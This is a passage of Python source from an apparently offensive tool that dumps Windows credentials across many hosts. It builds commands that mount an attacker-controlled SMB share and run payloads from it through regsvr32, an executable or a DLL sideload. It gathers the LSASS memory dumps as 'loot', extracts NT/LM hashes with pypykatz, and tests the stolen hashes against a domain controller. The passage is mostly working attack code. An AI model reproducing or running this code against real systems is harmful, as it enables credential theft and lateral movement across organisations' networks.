            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, drive_letter)
        elif options.payload == 'exe-mdwdpss' or options.payload == 'exe-mdwd':
            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
        elif options.payload == 'dllsideload-mdwdpss' or options.payload == 'dllsideload-mdwd':
            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, drive_letter)

        printnlog(command)
        printnlog('')

        if options.oe:
            alt_exec()

        printnlog('Total targets: {}'.format(len(addresses)))
        # multithreading yeah
        with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
            count = 1
            for ip in addresses:

                if options.localauth:
                    domain = ip
                try:
                    out = thread_exe.schedule(mt_execute, (ip, count,), timeout=options.timeout)
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback

                        traceback.print_exc()
                    lognoprint(str(e) + '\n')
                    logging.error(str(e))
                    continue
                except KeyboardInterrupt as e:
                    continue

                count += 1

        time.sleep(2)
        os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
        printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))

        # for when you're attacking a lot of targets to quickly see how many we got
        printnlog('\n{} Total Extracted LSA: {}/{}'.format(green_plus, len(fnmatch.filter(os.listdir("{}/loot/{}".format(cwd, timestamp)), '*.dmp')), len(addresses)))

        if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
            os.system('sudo rm {}/drives.txt'.format(cwd))

        dumped_hosts = glob.glob('{}/loot/{}/*.dmp'.format(cwd, timestamp))  # gets a list of all the .dmp file names within the output dir
        dumped_hosts_fin = []
        for item in dumped_hosts:
            dumped_hosts_fin.append(item[item.rfind('/') + 1:item.rfind('.')])  # this substring should make the filename hostname-ip only
        with open('{}/loot/{}/dumped_hosts.txt'.format(cwd, timestamp), 'w') as f:  # writes the list to a file
            for host in dumped_hosts_fin:
                f.write(host + '\n')
            f.close()

        if options.ap:
            printnlog('\n[parsing files]')
            os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(cwd, timestamp, cwd, timestamp))
            os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(cwd, timestamp, cwd, timestamp))
            os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$\|::' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))

            remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
            if remove_files.lower() == 'y':
                os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))

            if options.av:
                printnlog('\n{} Reading dumped_msv.txt'.format(green_plus))
                try:
                    with open('{}/loot/{}/dumped_msv.txt'.format(cwd, timestamp), 'r') as f:  # read the dumped_msv.txt file into msv_creds
                        msv_creds = f.readlines()
                        f.close()
                except BaseException as e:
                    printnlog('\n{}[!]{} There was an error reading the dumped_msv.txt file'.format(color_RED, color_reset))
                else:
                    msv_creds_cleaned = []
                    for cred in msv_creds:  # here we are going to remove any \r\n and any items that are missing a username
                        cred = cred.replace('\n', '')
                        cred = cred.replace('\r', '')
                        if cred.find('::') == -1 and cred.find('Domain:Username:NT:LM') == -1:
                            msv_creds_cleaned.append(cred)
                    if len(msv_creds_cleaned) > 0:
                        ip_to_check_against = input('\nEnter an IP to check the accounts against (Preferably a domain controller): ')

                        printnlog('\n{} Attempting to check {} creds\n'.format(green_plus, len(msv_creds_cleaned)))
                        tried_full = []
                        for item in msv_creds_cleaned:
                            try:
                                if item not in tried_full:  # this prevents duplicate attempts
                                    idx_of_2nd_colon = item.find(":", item.find(":") + 1)
                                    username = item[item.find(":") + 1:idx_of_2nd_colon]
                                    nthash = item[idx_of_2nd_colon + 1:-1]
                                    if acct_chk_fail.count(username) <= 3:  # antilockout check
                                        if username not in acct_chk_valid:  # why try again if we already found a valid set
                                            check_accts(username, None, domain, ip_to_check_against, ip_to_check_against, ':' + nthash, None, False, None, int(445))
                                            tried_full.append(item)
                                        else:
                                            printnlog('{}[!]{} Skipping {}:{} due to valid creds for account already found'.format(color_BLU, color_reset, username, nthash))
                                    else:
                                        printnlog('{}[!]{} Skipping {}:{} to prevent lockout'.format(color_BLU, color_reset, username, nthash))
                                else:
                                    printnlog('{}[!]{} Skipping {} because of duplicate creds'.format(color_BLU, color_reset, item))
                            except Exception as e:
                                printnlog(str(e))
                        print("")
                    else:
                        printnlog('{} There are no creds to check'.format(red_minus))

    except KeyboardInterrupt as e:
        logging.error(str(e))
        printnlog('\n{}[!]{} Cleaning up please wait'.format(color_YELL, color_reset))

        if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
            os.system('sudo rm {}/drives.txt'.format(cwd))

        try:
            os.system('sudo systemctl stop smbd')
            printnlog(green_plus + ' Stopped the smbd service')
        except BaseException as e:
            pass

        try:
            os.system('sudo cp ' + cwd + '/smb.conf /etc/samba/smb.conf')
            printnlog(green_plus + ' Cleaned up the smb.conf file')
        except BaseException as e:
            pass

        try:
            os.system('sudo rm ' + cwd + '/smb.conf')
        except BaseException as e:
            pass

        try:
            os.system('sudo userdel ' + share_user)
            printnlog(green_plus + ' Removed the user: ' + share_user)
        except BaseException as e:
            pass

        try:
            os.system('sudo groupdel ' + share_group)
            printnlog(green_plus + ' Removed the group: ' + share_group)
        except BaseException as e:
            pass

        try:
            os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
            printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
        except BaseException as e:
            pass

        try:
            os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
        except BaseException as e:
            pass

        print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
        sys.exit(0)

    printnlog('{}[-]{} Cleaning up please wait'.format(color_BLU, color_reset))
    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
        os.system('sudo rm {}/drives.txt'.format(cwd))

    try:
        os.system('sudo systemctl stop smbd')
        printnlog(green_plus + ' Stopped the smbd service')
    except BaseException as e:
        pass

    try:
        os.system('sudo cp ' + cwd + '/smb.conf /etc/samba/smb.conf')
        printnlog(green_plus + ' Cleaned up the smb.conf file')
    except BaseException as e:
        pass

    try:
        os.system('sudo rm ' + cwd + '/smb.conf')
    except BaseException as e:
        pass

    try:
        os.system('sudo userdel ' + share_user)
        printnlog(green_plus + ' Removed the user: ' + share_user)
    except BaseException as e:
        pass

    try:
        os.system('sudo groupdel ' + share_group)
        printnlog(green_plus + ' Removed the group: ' + share_group)
    except BaseException as e:
        pass

    try:
        os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
    except BaseException as e:
        pass

    print('{}[-]{} Cleanup completed! If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
    sys.exit(0)
